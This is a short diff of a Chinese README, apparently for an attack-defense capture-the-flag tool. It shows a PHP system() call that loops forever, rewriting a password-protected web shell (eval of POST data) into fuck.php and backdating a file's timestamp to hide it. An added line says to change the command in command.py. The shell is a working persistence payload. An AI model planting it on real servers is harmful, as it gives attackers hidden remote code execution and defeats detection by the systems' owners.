@@ -155,6 +155,8 @@ submit完成之后会有清空flag的选项(y/n)
 
 bash命令为:`system('while true;do echo \'<?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_POST[a]);} ?>\' >fuck.php;touch -m -d "2017-11-12 10:10:10" .index1.php;sleep 1;done;');`
 
+如果要修改请修改`command.py`中的`data[z0]`
+
 ---
 
 
